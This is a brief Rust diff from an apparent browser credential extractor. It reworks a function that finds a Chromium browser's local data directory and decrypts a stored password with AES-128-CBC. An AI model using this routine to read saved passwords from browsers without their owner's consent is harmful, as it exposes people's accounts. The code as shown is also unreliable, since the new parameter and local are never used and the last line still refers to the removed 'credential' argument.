@@ -22,7 +22,7 @@ type Aes128Cbc = Cbc<Aes128, Pkcs7>;
 
 pub fn decrypt_credential(
     chromium_browser: &ChromiumBrowser,
-    credential: &mut Credential,
+    encrypted_password: Vec<u8>,
 ) -> ExtractorResult<String> {
     let mut path = data_local_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;
     path.push(chromium_browser.paths.iter().collect::<PathBuf>());
@@ -52,6 +52,9 @@ pub fn decrypt_credential(
     }
 
     let cipher = Aes128Cbc::new_from_slices(&dk, &iv)?;
+
+    // decrypt requires a mutable ref
+    let encrypted_password = encrypted_password.to_vec();
 
     Ok(
         std::str::from_utf8(cipher.decrypt(&mut credential.encrypted_password[3..])?)
